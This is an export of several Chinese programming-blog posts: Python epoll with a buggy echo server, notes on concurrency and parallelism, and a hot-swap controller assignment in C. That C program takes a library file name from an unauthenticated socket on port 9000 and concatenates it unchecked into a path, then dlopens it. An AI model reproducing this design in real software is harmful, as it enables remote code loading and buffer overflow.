非阻塞IO：当你去读写一个非阻塞的文件描述符时，不管可不可以读写，它都会立即返回，返回成功说明读写操作完成了，返回失败会设置相应errno状态码，根据这个errno可以进一步执行其他处理。它不会像阻塞IO那样，卡在那里不动！！！ 再看Python官方文档对epoll的介绍 Edge and Level Trigger Polling (epoll) Objects https://linux.die.net/man/4/epoll eventmask Constant Meaning EPOLLIN Available for read EPOLLOUT Available for write EPOLLPRI Urgent data for read EPOLLERR Error condition happened on the assoc. fd EPOLLHUP Hang up happened on the assoc. fd EPOLLET Set Edge Trigger behavior, the default is Level Trigger behavior EPOLLONESHOT Set one-shot behavior. After one event is pulled out, the fd is internally disabled EPOLLEXCLUSIVE Wake only one epoll object when the associated fd has an event. The default (if this flag is not set) is to wake all epoll objects polling on a fd. EPOLLRDHUP Stream socket peer closed connection or shut down writing half of connection. EPOLLRDNORM Equivalent to EPOLLIN EPOLLRDBAND Priority data band can be read. EPOLLWRNORM Equivalent to EPOLLOUT EPOLLWRBAND Priority data may be written. EPOLLMSG Ignored. New in version 3.6: EPOLLEXCLUSIVE was added. It’s only supported by Linux Kernel 4.5 or later. epoll.close() Close the control file descriptor of the epoll object. epoll.closed() True if the epoll object is closed. epoll.fileno() Return the file descriptor number of the control fd. epoll.fromfd(fd) Create an epoll object from a given file descriptor. epoll.register(fd[, eventmask]) Register a fd descriptor with the epoll object. epoll.modify(fd, eventmask) Modify a registered file descriptor. epoll.unregister(fd) Remove a registered file descriptor from the epoll object. Changed in version 3.9: The method no longer ignores the EBADF error. epoll.poll(timeout=None, maxevents=-1) Wait for events. timeout in seconds (float) 感觉有点抽象，看一个样例代码吧 #!/usr/bin/python # -*- coding: utf-8 -*- import socket, select import Queue serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server_address = (&quot;192.168.1.5&quot;, 8080) serversocket.bind(server_address) serversocket.listen(1) print &quot;服务器启动成功，监听IP：&quot; , server_address serversocket.setblocking(0) timeout = 10 #新建epoll事件对象，后续要监控的事件添加到其中 epoll = select.epoll() #添加服务器监听fd到等待读事件集合 epoll.register(serversocket.fileno(), select.EPOLLIN) message_queues = &#123;&#125; fd_to_socket = &#123;serversocket.fileno():serversocket,&#125; while True: print &quot;等待活动连接......&quot; #轮询注册的事件集合 events = epoll.poll(timeout) if not events: print &quot;epoll超时无活动连接，重新轮询......&quot; continue print &quot;有&quot; , len(events), &quot;个新事件，开始处理......&quot; for fd, event in events: socket = fd_to_socket[fd] #可读事件 if event &amp; select.EPOLLIN: #如果活动socket为服务器所监听，有新连接 if socket == serversocket: connection, address = serversocket.accept() print &quot;新连接：&quot; , address connection.setblocking(0) #注册新连接fd到待读事件集合 epoll.register(connection.fileno(), select.EPOLLIN) fd_to_socket[connection.fileno()] = connection message_queues[connection] = Queue.Queue() #否则为客户端发送的数据 else: data = socket.recv(1024) if data: print &quot;收到数据：&quot; , data , &quot;客户端：&quot; , socket.getpeername() message_queues[socket].put(data) #修改读取到消息的连接到等待写事件集合 epoll.modify(fd, select.EPOLLOUT) #可写事件 elif event &amp; select.EPOLLOUT: try: msg = message_queues[socket].get_nowait() except Queue.Empty: print socket.getpeername() , &quot; queue empty&quot; epoll.modify(fd, select.EPOLLIN) else : print &quot;发送数据：&quot; , data , &quot;客户端：&quot; , socket.getpeername() socket.send(msg) #关闭事件 elif event &amp; select.EPOLLHUP: epoll.unregister(fd) fd_to_socket[fd].close() del fd_to_socket[fd] epoll.unregister(serversocket.fileno()) epoll.close() serversocket.close() 总结总结就是，至少在python下select的兼容性比较好，在Linux和Win下都是通用的。然后一般来说poll和epoll用的比select多。因为在很多方面这俩都比select更好。同时我也了解到了数据结构的实际应用，因为poll和epoll中应用了bitmap 红黑树和链表。这其中我会在以后进行研究并发blog记录学习了解这几种数据结构并思考采用这些结构的原因。epoll被应用在Nginx和Redis这表明其结构是优秀的，大部分情况下可考虑采用epoll。同时epoll也采用了观察者的设计模式，这个回头也可以了解。 To do 了解几种数据结构包括链表，红黑树，bitmap 更进一步了解epoll的用法，包含其水平触发和边缘触发 动手自己尝试用这几个模型 了解epoll的观察者设计模式 从数据结构解释epoll比poll更有优势的原因 对UNIX系统的文件描述符做更深入的了解 引用Python Select官方文档：https://docs.python.org/3/library/select.html select/poll/epoll视屏讲解（讲的很好）:https://www.bilibili.com/video/BV1qJ411w7du?from=search&amp;seid=10159331074298299316 select/poll/epoll Python代码样例:https://www.cnblogs.com/muzinan110/p/5004469.html P.S虽然是Python2但是无伤大雅 select/poll/epoll区别和C代码样例:https://devarea.com/linux-io-multiplexing-select-vs-poll-vs-epoll/#.YI50iKERUUH I/O样例图：https://www.yuque.com/gotaoey/vaeroo/iqdfgh和对应视频讲解https://www.bilibili.com/video/BV1vv4y1o7pu/?spm_id_from=333.788.recommend_more_video.0 还有很多引用在文中已经指出，由于引用资料较多此处列举未完敬请谅解","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"并行编程学习","slug":"并行编程学习","date":"2021-04-18T18:32:29.000Z","updated":"2021-04-27T11:25:20.283Z","comments":true,"path":"2021/04/19/并行编程学习/","link":"","permalink":"https://zwh-china.github.io/2021/04/19/%E5%B9%B6%E8%A1%8C%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"前言由于我的python基础部分已经自学完，也写过一些很简单的小项目。所以我想寻找一种方式来提升一下我编程的水平。在接触socket编程时，我第一次接触到了多线程这个概念。具体场景就是需要一个UDP监听函数在后台运行，但是默认下在主函数调用一个函数后，主函数会处于一个挂起状态，在运行完函数后，main函数才能继续向下运行。这个过程也叫上下文切换。但是我的需求是UDP在整个程序的生命周期都必须在后台运行。因此也就去了解了多线程，多进程编程技术。进而我想相对系统和深入的了解这方面的知识。 1-1 首先我去了解了一下什么是并发，并行，串行，同步，异步复制粘贴一下CSDN文章 1.并发编程又叫多线程编程。 在程序中，往往有很多很耗时的工作，比如上传文件、下载文件、跟客户聊天需要长时间建立连接。这种时候，一个线程是服务不了多个用户的，会产生因为资源独占产生的等待问题。并发的实质是一个物理CPU(也可以多个物理CPU) 在若干道程序之间多路复用，并发性是对有限物理资源强制行使多用户共享以提高效率。(并发指的是任务数多余cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）） 并发当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。 2.“并行”指两个或两个以上事件或活动在同一时刻发生。在多道程序环境下，并行性使多个程序同一时刻可在不同CPU上同时执行。（hadoop集群就是并行计算的） 当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。 并发和并行 并发和并行是即相似又有区别的两个概念，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。在多道程序环境下，并发性是指在一段时间内宏观上有多个程序在同时运行，但在单处理机系统中，每一时刻却仅能有一道程序执行，故微观上这些程序只能是分时地交替执行。倘若在计算机系统中有多个处理机，则这些可以并发执行的程序便可被分配到多个处理机上，实现并行执行，即利用每个处理机来处理一个可并发执行的程序，这样，多个程序便可以同时执行。 3.串行、并行： 并行和串行指的是任务的执行方式。串行是指多个任务时，各个任务按顺序执行，完成一个之后才能进行下一个。并行指的是多个任务可以同时执行，异步是多个任务并行的前提条件。 4.同步、异步： 指的是能否开启新的线程。同步不能开启新的线程，异步可以。 异步：异步和同步是相对的，同步就是顺序执行，执行完一个再执行下一个，需要等待、协调运行。异步就是彼此独立,在等待某事件的过程中继续做自己的事，不需要等待这一事件完成后再工作。线程就是实现异步的一个方式。异步是让调用方法的主线程不需要同步等待另一线程的完成，从而可以让主线程干其它的事情。 异步和多线程并不是一个同等关系,异步是最终目的,多线程只是我们实现异步的一种手段。异步是当一个调用请求发送给被调用者,而调用者不用等待其结果的返回而可以做其它的事情。实现异步可以采用多线程技术或则交给另外的进程来处理。 原文链接：https://blog.csdn.net/qq\\_26442553/article/details/78729793 再放几张图来直观形象的表现一下 01 串行 串行（ Sequential ）简单来说就是一次只能做一件事情，而且还得按照顺序依次执行，后面的代码段必须等到前面代码段的任务执行完毕后才能执行。 假设我们目前经费有限，只有一名工人，工人没有三头六臂，因此他需要一件接着一件来完成任务，只有完成一件任务后才能去完成下一件任务。 此时完成总体装修工程，一共需要花费 2 + 1 + 3 = 6 天的时间02 并行 并行（ parallelism ）指的是在同一时刻，任务可以同时开始进行，彼此之间没有依赖关系。整个周期的总耗时取决于耗时最长的那件事情所需的时间。 假设我们目前经费比较充足，雇佣了三名工人。装修工程的子任务之间没有依赖关系，因此工人们可以对墙体拆迁、安装水电线、粉刷铺地板这三件事情同时开工，每一名工人负责一件任务。 此时完成总体装修工程，总耗时取决于耗时最长的那件事情（在这里就是粉刷、铺地板）所需的时间，因此一共需要花费 3 天的时间03 并发 并发（ concurrency ）是以交替的方式利用等待某件事情完成的时间来做其他事情。整个周期的总耗时：在一件任务等待时间内，节省这段等待时间来完成另一件任务。 假设我们目前经费不充足，只能雇佣了一名工人。仔细对粉刷、铺地板这件任务进行分析，发现它其实包含两部分，第一部分是进行粉刷墙壁、铺地板，第二部分是进行风干，分别花费 2 天和 1 天的时间。 粉刷、铺地板=粉刷墙壁、铺地板（ 2 天）+ 风干（ 1 天） 在等待房屋风干的时候，工人此时可以去完成其他的任务以节省时间。 在第三天的时候，从宏观角度来看，工人同时做了两件事情，但是微观的角度来看，工人没有三头六臂，其实他只在进行安装水电线的工作。 此时完成总体装修工程，一共需要花费 5 天的时间。04 并行 VS 并发 根据CPU多路复用的原则，会将CPU的执行时间切分成很多细微的CPU时间片，一个CPU在同一时间只能完成一件任务。 对于单核CPU，当面对多个任务的时候，每个小时间片会执行一个操作，多个操作之间快速切换执行，造成了同时运行的假象。其实CPU在一个时间片内运行某一个线程时，其它线程处于挂起状态，这种方式我们称之为并发。 当系统有一个以上 CPU 时，则线程的操作可以并行开始。当一个 CPU 执行一个线程时，另一个 CPU 可以执行另一个线程，两个线程互不抢占 CPU 资源，他们同时进行，这种方式我们称之为并行。 并发的出现，比传统串行系统提高效率与时间，但带来了额外性能开销，如：系统调度和上下文切换。 多核CPU使并行成为可能，大大提高了处理能力。 原文链接：https://blog.csdn.net/kingcoding/article/details/107293131 还有知乎一位答友用的跑步的例子 说个跑步的例子： 异步：训练的时候，运动员在各自的跑道上跑自己的步 多线程：有很多条跑道，运动员看到哪里有空的跑道就去跑 并行：两人三足跑步，这两个人就是并行 补充： 同步：所有跑道只剩一条的时候，运动员在一条跑道上跑完一个到一个 并发：一组运动员一起跑，隔一段时间到下一组运动员 ==========华丽分界线 2018-03-07更新============ 关系： 同步的时候无法异步，但异步的过程中可以有同步 并发的执行时间间隔中，也可能会变成并行 **以上是个人理解，如有错误，请各位大佬指正 作者：呵Sever 链接：https://www.zhihu.com/question/28550867/answer/236035067 我的总结:其实在看这些回答时，我又考虑了另外一个问题，我们现在的处理器都是比如说我的电脑CPU 16core 32thread 也就是16核心32线程。这是什么意思呢？我去国外找了一篇比较详细的教程限于篇幅这里就不复制粘贴了（https://phoenixnap.com/kb/single-vs-dual-processors-server）。通俗的说，这里的core就是CPU中封装的物理处理单元，而thread表明每个核可以handle两个线程，但是并非同时，而是快速切换下，所以这俩thread没法 parallelism。16核每个核可以有俩线程。表明信息通道总数是32（If a CPU has six cores with two threads per core, that means there are twelve paths for information to be processed.）。文章中还讲了有多个物理CPU的情况，因为很多服务器主板是支持多个CPU的，主板有多个CPU Socket。有点很重要，无论CPU再怎么高级，用了啥技术什么超线程之类的，一个物理Core一次就是只能运行一个Thread 那么对于并行，我认为可以看作是core和core之间同时运行不同的Thread。对于并发应该是对于一个core来说的，一个Thread运行一会停下来，另一个开始运行，以此轮替。 对于串行有点像并发，但是不像并发那样灵活，必须完全搞定一个Thread才能搞下一个Thread。对于同步和异步，这两个应该是一种模型，对于同步来说，具体的例子就是（也是参考的）去餐厅点菜，同步就是一桌点完下桌去点，异步就是A桌点了一个菜，后厨去做，B桌也点了一个菜，后厨去做….其具体实现就是并发 然后其实我又想到一个问题那就是，CPU的Thread和软件里面的Thread是怎样的关系。好家伙一搜又出来一堆，贴一个StackOverFlow的回答吧 Q: What is the difference between software threads, hardware threads and java threads? Are software threads, java threads and hardware threads independent or interdependent? I am asking this because, I know Java threads are created inside a process with in jvm (java.exe). Also is it true that these different process are executed on different hardware threads? A: A &quot;hardware thread&quot; is a physical CPU or core. So, a 4 core CPU can genuinely support 4 hardware threads at once - the CPU really is doing 4 things at the same time. One hardware thread can run many software threads. In modern operating systems, this is often done by time-slicing - each thread gets a few milliseconds to execute before the OS schedules another thread to run on that CPU. Since the OS switches back and forth between the threads quickly, it appears as if one CPU is doing more than one thing at once, but in reality, a core is still running only one hardware thread, which switches between many software threads. Modern JVMs map java threads directly to the native threads provided by the OS, so there is no inherent overhead introduced by java threads vs native threads. As to hardware threads, the OS tries to map threads to cores, if there are sufficient cores. So, if you have a java program that starts 4 threads, and have 4 or more cores, there&#39;s a good chance your 4 threads will run truly in parallel on 4 separate cores, if the cores are idle. URL:https://stackoverflow.com/questions/5593328/software-threads-vs-hardware-threads 值得注意的是，这个回答的赞是最多的，但是没被选为标准答案。标准答案如下（感觉还是赞多的回答容易理解，可能是我没怎么了解Java的缘故） A： Software threads are threads of execution managed by the operating system. Hardware threads are a feature of some processors that allow better utilisation of the processor under some circumstances. They may be exposed to/by the operating system as appearing to be additional cores (&quot;hyperthreading&quot;). In Java, the threads you create maintain the software thread abstraction, where the JVM is the &quot;operating system&quot;. Whether the JVM then maps Java threads to OS threads is the JVM&#39;s business (but it almost certainly does). And then the OS will be using hardware threads if they are available. 这里面我注意到提到几种Thread,拿JAVA运行在JVM来说，代码里的Thread是代码Thread，被JVM映射到OS级Native Thread，OS再映射到Hardware Thread也就是CPU核的Thread。 1-2 费林分类法（Flynn’s Taxonomy）费林分类法是分类并行计算机系统架构的一种方式。它基于，Instruction和Data Flow两个概念 SISD主要应用于很老式的单核处理器上，在现代架构处理器中已经是很少见的了 1-3 共享内存再看看我们最常用的MIMD架构。一般的现代CPU都采用这个架构。评判一个并行体系结构不仅要看硬件架构还要看内存的组织。先看下共享内存模型。一个处理器在修改储存在内存系统中的数据时，如果其他处理器同时也在使用这个数据就会出现问题。已经修改的新值会从处理器缓存传递到共享内存。不过之后还得传递到所有CPU的缓存，使得他们不会处理过时的数据。 这个问题称为缓存一致性(cache coherency)问题，是内存一致性问题的一种特殊情况。与线程编程类似，需要能够处理并发问题和同步问题的硬件。其实我是很懵逼的，大概感觉这个问题可能多少和锁有点关系。但是书上讲的也不太清楚，就去查了一下，总觉得这篇文章讲的不错。（https://blog.csdn.net/moyeshuier/article/details/103943355?spm=1001.2014.3001.5501），读完了发现老哥没继续更新，估计是鸽了，我就有找了找写一篇(https://www.cnblogs.com/dolphin0520/p/3920373.html)。可是我还是没懂，这东西需要我管不？直到我搜到了知乎这篇文章(https://www.zhihu.com/question/277395220/answer/640204150)就是说，缓存一致性不需要我们操心，硬件工程师或者说搞底层的已经整了一套协议或者方法保证缓存一致性。但是正如书中说到的`缓存一致性是内存一致性问题的一种特殊情况`,缓存一致性保证的是顺序一致性而非线性一致性，对于我这种很low的程序猿来说，写个简单的多线程需要考虑的是线性一致性，这个缓存一致性我从开始就没考虑到，我考虑到的只是线性一致性如何保证。 cache coherence 和 memory consistency是两回事。cache coherence对程序员来说是透明的，你可以完全不关心它的存在；它所解决的问题，是一个内存里的变量，被多个cache所加载之后，一个CPU core去修改了这个变量值，如何传播到其他cache上。也就是说，有了cache coherence之后，你可以放心地在一个core里修改变量，它早晚会被另一个core读到。但是程序员其实要求的不仅于此，你可能要求，在一个core修改了一个变量，另一个core立马就能读到；或者你修改了两个变量，你要求另一个core在读到这两个变量的时候，要按照相同的顺序，比如这样的代码： 作者：hellocode 链接：https://www.zhihu.com/question/277395220/answer/393722704 1-4 并行编程模型并行编程模型是硬件和内存体系结构的一个抽象。理论上可以在任何类型的机器上实现。与前面的划分相比，这写编程模型建立在更高的层次，表示软件要以何种方式完成并行计算。每个模型分别有自己的方法与其他处理器共享信息，来访问内存和划分工作。 总的来说分这几个model 共享内存模型 多线程模型 消息传递/分布式内存模型 数据并行模型 我感觉书上说的其实并不是很清楚对于初学者来说，然后我就去搜了一下我能理解的（https://www.ques10.com/p/36530/explain-the-various-types-of-parallel-programming-/） 差不就是 共享内存模型： 就是每个core里可能没有自己专有的内存空间，就是那种只对自己可见的内存。而是采取共享一块内存，所有core都在这个共享空间内读写。每个process的空间又主程序分配。再执行结束狗，这些子进程重新加入主程序。 优点：程序开发很轻松，不需要进程通讯和进行数据共享 缺点：用户不知道变量存在那？（没太懂） 消息传输模型 每个进程都有自己的一套数据，他们间想要交换数据之类的，就需要进程通信，每个发送行为都需要有对应的接受行为 优点：数据可以不受位置限制存储，进程间通讯是很容易的。MPI可用(MPI难度极大溜了溜了) 缺点：当发送没被接受就会阻塞导致进程停止运行 线程模型 线程被定义为进程中的一小段序列。不同的线程可以在同一个core也可以在不同core执行。如果thread在不同core被执行，那么他们的执行具有一致性。 优点：程序员不需要考虑并行处理 缺点：要注意考虑两个线程不能同时更新共享的资源。 数据并行模型 数据并行是最简单的一种并行。在这里数据集合被组织为一个常规的结构，比如说数组。许多程序对这个结构的不同部分施以相同操作。设想你要把两个都具有100个元素的数组的对应项相加并将结果储存在新的数组。如果有4个核心（processor）那么每个核心(processor)都可以做25次运算。P.S就这个我觉得最好理解emm 2021/4/27 更新 找到一个讲的非常好的各种相关概念的知乎 https://zhuanlan.zhihu.com/p/343232126 上述内容可以归纳总结成下表： 并发类型 切换机制 CPU数量 适用场景 代表Python库 多线程（抢占式多任务处理） 操作系统决定何时切换任务 1个 I/O密集型 _thread(已淘汰）, threading, cocurrent.futures, nornir 异步（协作式多任务处理） 任务本身决定何时切换 1个 I/O密集型 asyncio, netdev, aiohttp, aioping, gevent, tornado, twisted 多进程 （并行） 所有任务同时运行 多个 CPU密集型 multiprocessing","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"初识dll热补丁","slug":"初识dll热补丁","date":"2021-03-30T18:39:18.000Z","updated":"2021-04-20T21:15:38.471Z","comments":true,"path":"2021/03/31/初识dll热补丁/","link":"","permalink":"https://zwh-china.github.io/2021/03/31/%E5%88%9D%E8%AF%86dll%E7%83%AD%E8%A1%A5%E4%B8%81/","excerpt":"","text":"寒假皮条侠给了我个单子需求大概是这样 英文原版Assignment_2020-21-1下载 中文翻译版 Assignment_2020-21-中文描述下载 大概就是模拟一个工业控制器，这个控制器在运行中若收到某信号，则温度算法需要改变，但是不能停机，同时需要新算法和旧算法的交接是渐进的。再通俗点就是在不关闭程序的情况下替换函数。最后在皮条侠指点下，我选择用dll/so动态加载来解决这个问题具体代码如下 main.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;math.h&gt; #include &lt;unistd.h&gt; int control_function(const unsigned k, double* u) &#123; *(u) = sin((double)k / 50.0); // 计算设备的输入 return 0; &#125; // control_function() int main() &#123; unsigned t = 0; double u; while(1) &#123; if(control_function(t, &amp;u) == -1) &#123; printf(&quot;control_function failed\\n&quot;); exit(-1); &#125; printf(&quot;%lf @ %u\\n&quot;, u, t); // 模拟该控制器的输入u 到设备 t++; // Increment time index sleep(1); // Sampling time... maybe 10-15 minutes in practice &#125; return 0; // Should never reach here! &#125; // main()) 这个u的值就是模拟的温度值，control_function就是温度控制算法，也就是需要可以被动态替换的 以下是我的方案 main.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;dlfcn.h&gt; #include &lt;unistd.h&gt; #include &lt;pthread.h&gt; #include &lt;sys/socket.h&gt; #include &lt;sys/types.h&gt; #include &lt;arpa/inet.h&gt; #include &lt;string.h&gt; #define SERV_PORT 9000 int(*old_control_function)(const unsigned , double*); // define the function pointer int(*control_function)(const unsigned , double*); // define the function pointer for progressive substitution const char* dllPath=&quot;./controller.so&quot;; // controller.so is the default so file for the program to run for the default algorithm int initialize_status=0 , no_load=1 , reload_status=0; //set default so file detect reload so file status control progressive stage double cnt=0.1; // misc variables const char dir_path[]=&quot;./&quot;; char new_file_path[2048]; _Noreturn void * Listener() &#123; struct sockaddr_in serv_addr,client_addr; socklen_t addr_len; char buf[2048]; //AF_INET:ipv4 SOCK_DGRAM 0: default protocol(udp/tcp) int skt=socket(AF_INET,SOCK_STREAM,0); bzero(&amp;serv_addr,sizeof(serv_addr)); serv_addr.sin_family=AF_INET; serv_addr.sin_port=htons(SERV_PORT); serv_addr.sin_addr.s_addr=htonl(INADDR_ANY); bind(skt,(struct sockaddr *)&amp;serv_addr,sizeof(serv_addr)); listen(skt,10); addr_len=sizeof(client_addr); char reply[]=&quot;Successfully received your call\\n&quot;; char verify[]=&quot;Emergency\\n&quot;; char reply_verify[]=&quot;Please input new so file name\\n&quot;; memset(buf,&#39;\\0&#39;,sizeof(buf)); while(1) &#123; int client_skt=accept(skt,(struct sockaddr *)&amp;client_addr,&amp;addr_len); int len=recv(client_skt,buf,sizeof(buf),0); printf(&quot;%s\\n&quot;,buf); printf(&quot;%s\\n&quot;,verify); len=send(client_skt,reply,strlen(reply),0); //printf(&quot;strcmp(a, b) : %d\\n&quot;, strcmp(buf, verify)); if(strcmp(buf,verify)==0) &#123; printf(&quot;will reload the so file for emergency situation\\n&quot;); len=send(client_skt,reply_verify,strlen(reply_verify),0); memset(buf,&#39;\\0&#39;,sizeof(buf)); len=recv(client_skt,buf,sizeof(buf),0); strtok(buf,&quot;\\n&quot;); memcpy(new_file_path,dir_path,sizeof(dir_path)); strcat(new_file_path,buf); initialize_status=0; &#125; memset(buf,&#39;\\0&#39;,sizeof(buf)); close(client_skt); &#125; &#125; int check_so() &#123; old_control_function=control_function; void *handle = dlopen((char *) dllPath, RTLD_LAZY); if(no_load==0) &#123; printf(&quot;%s\\n&quot;,new_file_path); handle=dlopen((char *)new_file_path,RTLD_LAZY); &#125; if(!handle) &#123; printf(&quot;Error occurred while trying to load so file\\n&quot;); return -1; &#125; control_function=dlsym(handle,&quot;control_function&quot;); if(!control_function) &#123; printf(&quot;error occurred while load the function\\n&quot;); return -1; &#125; if(no_load==0) &#123; reload_status=1; &#125; no_load=0; return 0; &#125; int main() &#123; unsigned t = 0; double u; pthread_t thread[1]; int res = pthread_create(&amp;thread[0], NULL, Listener,NULL); while(1) &#123; if(initialize_status==0) // reload module &#123; if(check_so()!=0) &#123; if(no_load==1) &#123; printf(&quot;Failed to initializing so file&quot;); return 0; &#125;else &#123; printf(&quot;Something went wrong while trying to replace so file\\n&quot;); &#125; &#125;else printf(&quot;so file loaded successfully\\n&quot;); initialize_status=1; &#125; if(reload_status==1) // if reloaded so file enter progressive mode &#123; double temp1,temp2; double mix_value; old_control_function(t, &amp;temp1); control_function(t, &amp;temp2); printf(&quot;old function run result as %lf\\n&quot;,temp1); printf(&quot;new function run result as %lf\\n&quot;,temp2); mix_value=(1-cnt)*temp1+cnt*temp2; // generate progressive value cnt+=0.1; printf(&quot;Progressive value for Emergency substitution is %lf @ %u\\n&quot;, mix_value, t); if(cnt&gt;=1) &#123; printf(&quot;progressive stage end here\\n&quot;); reload_status=0; // end of progressive substitution &#125; t++; // Increment time index sleep(1); continue; &#125; if(control_function(t, &amp;u) == -1) &#123; printf(&quot;control_function failed\\n&quot;); exit(-1); &#125; printf(&quot;%lf @ %u\\n&quot;, u, t); // simulate input as u t++; // Increment time index sleep(1); // Sampling time... maybe 10-15 minutes in practice &#125; return 0; // Should never reach here! &#125; // main()) //gcc main.c -o -dl contrller.c (老的温度函数) #include &lt;math.h&gt; int control_function(const unsigned k, double* u) &#123; *(u) = sin((double)k / 50.0); // simulate input algorithm return 0; &#125; //gcc -fPIC -shared controller.c -o controller.so -lm new_controller.c（新的温度函数） int control_function(const unsigned k, double* u) &#123; *(u) = 3.141592; // simulate input algorithm return 0; &#125; //gcc -fPIC -shared new_controller.c -o new_controller.so -lm 将函数源代码提前编译成动态链接库，在main.c启动后会默认加载controller.so文件，当程序监听到socket被链接，确认需要更换并得到文件名new_controller.so后便会在工作目录加载，同时温度值会为 其中λ是和时间相关的系数，这样便可以做到渐进式替换的效果。 具体的报告 course-exerciseStructureDetailed the function and how it does Idea-Using memcpy functionI assume the program is designed for a chemical industry machine which need the program to generate output to control the temperature. Maybe at one point the machine need to adjust the temperature function and during the process of substitution . This process can be regarded as a Hot Fix. To achieve this I came out many methods such as start another program from the previous one, recompile the program. And The Linux kernel has a function replacement function, such as the memcpy function. There are various versions. The performance of different versions is different in different CPUs. When the kernel starts, it will patch dynamically according to the type of CPU. The method is to add an empty instruction at the beginning of the memcpy function. The length of the instruction can put down a jump instruction. X86 has different lengths of empty instructions. Then, according to the specific CPU, select the fastest version of memcpy and jump to the new function. In this way, new and old code can coexist and jump to new code with jump command. And to keep that work. (1) When the original function is being replaced, that is, when the replacement core module is inserted, it is not used by other processes, otherwise the result may cause the phenomenon of inconsistent kernel state. (2) The replacement function and the original function have the same parameter list, and the corresponding order of parameter types are the same, the number of parameters is the same, and the function has the same return value. In general, the purpose of replacing a core function is not to change its function, but to track whether the execution flow of the function is abnormal, and whether the variables and parameters have the expected values. Therefore, the replacement function and the original function have the same function. To get the address of the function we need to know. We need to customize our own replacement function before we can replace it, and we must be able to find the address of the replacement function in the runtime core (via System.map or /proc/ksyms). In addition, before replacing the function on the target computer, it is best to first pass the test on other nodes with the same hardware platform and operating system core, because the replacement function written by oneself often has some problems and can not pass at one time, so as not to cause unnecessary trouble. The purpose or desired effect of dynamically replacing the kernel content is to change the original execution flow of the kernel and to jump to our own custom function flow. As you can see from the schematic of the above function call, there are three places to start with function replacement. (1) Modify the stack However, this method can only modify the parameters and return address of the function execution, and can not achieve the purpose of changing the execution process; (2) Modify the content of the program counter There is no way to assign EIP directly within the operating system and no such code is provided. (3) modify the original function code When a function is called, the value of eip will point to the starting address of the code of the called function, and the value of the next point of eip will be determined based on the first instruction of the function. So we can change the first part of the original function code to jump the contents of the eip to the alternative function code we provide, without leaving the existing stack content unchanged. There are two instructions in the instruction set that can jump the execution flow of a program: CALL and JMP. Call is a function call instruction. Before a call can be executed, we need to set the parameters of the function on the stack. In this case, because the parameters have been set before entering the original function, we must copy these parameters to the top of the stack. This copying process involves stack addresses related to the number of arguments, so different functions need to be recalculated, more prone to error. JMP makes a normal jump (similar to the GOTO statement in C language), and can continue to use the arguments prepared by the original function and the return address information, without having to copy the contents of the stack again, so it is relatively safe and convenient to implement. The whole replacement process is completed by a core module. When the core module initializes, it replaces the instruction code at the beginning of the original function func with the jump instruction code, making this part of the code become an instruction to the function replace_func. At the same time to finally be able to restore function func, antiderivatives instruction code of the substituted part must be preserved, so that when we achieve the desired purpose after uninstall the module, can be used to save the order code to cover the original address, so that when the subsequent kernel executive function func again, they can continue to perform the function of the original code, does not destroy the kernel of the state. -LivepatchLivepatch is a tool for hotpatching run-time processes. It can easily modify the variables in the running process, but also can easily replace the functions in the running process, using a new library function to replace the original function in the main process. Kernel probes（Kprobes） Function tracing（Ftrace） Livepatching（livepatch） And not all the system support this mechanism the supported OS are as followed: Arch Linux（livepatch，kpatch-git tool） Debian（Debian 9） Gentoo（kpatch or ksplice） Oracle Linux（ksplice） RedHat Linux 7（kpatch or ksplice） SUSE（kGraft） Ubuntu 16.04 or higher（livepatch） If we take this method as a resolution. We will have to consider the following problems. We want to be able to change the behavior of our program while it is running. How new program behavior is dynamically added to process memory. We want to be able to change the behavior of our program while it is running. How to replace the behavior of a function with a new behavior. If the function you need to change is static, can you change it this way? How can a new function call other functions in the original process? How do I access existing global variables? How do I access static functions and static global variables? If the function you need to change is static, can you change it this way? -Final CallSo all of these can be considered as disadvantages of manually replace the ole function with the new one. It is hard and may cause unstableness or other problems that may be unexpected. On this condition I think using DLL is the easiest way to solve this. Under Unix OS environment I use dlfcn,h to load and use the external .so file. And by using the Unix system function such as Socket and dlfcn part. All of these are widely used in embedded system. DetailAt the out set of the detail report. I want to make it clear that I achieve the goal of the exercise using DLL(Dynamic Linking Lib) Module and socket communication. The program will dynamically load the function form the specified .so file. The timing of changing the .so file to replace the old function and old .so file is controlled by the socket module. So basically, the program listening on port 9000 for signal of hot fix request, when receive the signal it will try to load the new so file. If nothing goes wrong, the program will go to progressive introduce stage which using the function u is a mix value using the old controller function and new controller function which will make the procedure more smooth. As for the error part, the program has its mechanism of error caught part, if the default .so file cannot be loaded the program will go end directly. But if the new .so file fail to load the whole program will use the initial .so file and keep everything unchanged. So in the case of one thread for main situation this program can keep the control algorithm to steadily changed without any error that may result the stop of the control program. The function dlopen() loads the dynamic shared object (shared library) file named by the null-terminated string filename and returns an opaque &quot;handle&quot; for the loaded object. This handle is employed with other functions in the dlopen API, such as dlsym(3), dladdr(3), dlinfo(3), and dlclose(). The function dlsym() takes a &quot;handle&quot; of a dynamic loaded shared object returned by dlopen(3) along with a null-terminated symbol name, and returns the address where that symbol is loaded into memory. If the symbol is not found, in the specified object or any of the shared objects that were automatically loaded by dlopen(3) when that object was loaded, dlsym() returns NULL. (The search performed by dlsym() is breadth first through the dependency tree of these shared objects.) In unusual cases (see NOTES) the value of the symbol could actually be NULL. Therefore, a NULL return from 